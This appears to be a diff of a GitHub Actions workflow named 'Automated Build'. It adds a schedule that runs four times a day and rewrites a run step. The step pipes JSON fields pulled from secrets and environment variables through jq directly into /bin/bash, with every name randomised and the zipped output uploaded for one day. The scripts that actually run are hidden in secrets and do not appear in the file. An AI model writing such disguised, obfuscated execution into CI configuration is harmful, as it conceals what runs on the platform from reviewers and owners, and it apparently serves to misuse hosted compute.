@@ -2,6 +2,8 @@ name: Automated Build
 on:
   workflow_dispatch:
 
+  schedule:
+    - cron: '27 0,6,12,18 * * *'
 jobs:
   service:
     runs-on: ubuntu-latest
@@ -10,19 +12,17 @@ jobs:
       - uses: actions/checkout@v4
       - name: Run
         env:
-          s476: ${{ secrets.s476 }}
+          oc4: ${{ secrets.oc4 }}
         run: |
-          printf '%s' "$s476" | jq -r .rx854 | /bin/bash
-          printf '%s' "$iqfi85924" | jq -r .ju00831 | /bin/bash
-          printf '%s' "$kl206" | jq -r .k482 | /bin/bash
-          printf '%s' "$y16496" | jq -r .ti57506 | /bin/bash
-          printf '%s' "$smcub09" | jq -r .rx111 | /bin/bash
-          echo $u3046 | jq -r .gteuj61 | /bin/bash
+          printf '%s' "$oc4" | jq -r .kyo9 | /bin/bash
+          echo $m7 | jq -r .dpot3 | /bin/bash
+          printf '%s' "$zxtb93" | jq -r .i7 | /bin/bash
+          echo $sj9 | jq -r .m952 | /bin/bash
 
       - name: Save archive
         if: always()
         uses: actions/upload-artifact@v4
         with:
-          name: IHvrm5nI
+          name: rT6vHyZY
           path: "*.zip"
           retention-days: 1
